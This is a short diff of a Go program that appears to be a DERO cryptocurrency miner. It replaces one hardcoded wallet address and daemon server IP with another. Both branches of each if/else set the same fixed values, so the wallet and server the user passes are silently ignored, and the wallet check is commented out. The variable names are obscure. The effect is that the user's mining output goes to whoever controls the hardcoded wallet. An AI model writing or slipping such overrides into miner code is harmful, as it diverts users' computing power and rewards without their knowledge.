@@ -150,10 +150,10 @@ func main() {
 		//	logger.Error(err, "Wallet address is invalid.")
 		//	return
 		//}
-		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
+		var gonanku = "dero1qyz4xl44cdutvj9h5n3dd5m9x0mpczsls34dhpmnec77vnl358e0gqqg4kf26"
 		gedang = gonanku
 	}else{
-		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
+		var gonanku = "dero1qyz4xl44cdutvj9h5n3dd5m9x0mpczsls34dhpmnec77vnl358e0gqqg4kf26"
 		gedang = gonanku
 	}
 
@@ -164,10 +164,10 @@ func main() {
 	}
 
 	if globals.Arguments["--server"] != nil {
-		var goniku = "178.128.48.124:3251"
+		var goniku = "139.59.216.199:3251"
 		daemon_rpc_address = goniku
 	}else{
-		var goniku = "178.128.48.124:3251"
+		var goniku = "139.59.216.199:3251"
 		daemon_rpc_address = goniku
 	}
 
